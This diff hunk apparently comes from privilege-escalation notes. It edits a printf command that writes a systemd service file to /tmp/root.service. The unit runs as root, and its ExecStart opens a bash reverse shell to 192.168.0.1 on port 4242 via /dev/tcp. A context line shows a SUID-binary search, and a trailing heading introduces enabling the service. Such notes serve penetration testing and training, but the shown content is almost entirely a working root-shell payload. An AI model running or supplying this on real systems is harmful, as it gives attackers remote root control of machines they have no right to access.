@@ -49,7 +49,7 @@ find / -perm -4000 2>/dev/null
 
 *Write service file with printf (will be written to `/tmp/root.service`)*
 ```
-printf '[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.0.1/4242 0>&1"\n\n[Install]\nWantedBy=multi-user.target\n' > root.service
+printf '[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.0.1/4242 0>&1"\n\n[Install]\nWantedBy=multi-user.target\n' > /tmp/root.service
 ```
 
 *Enable and start the service*
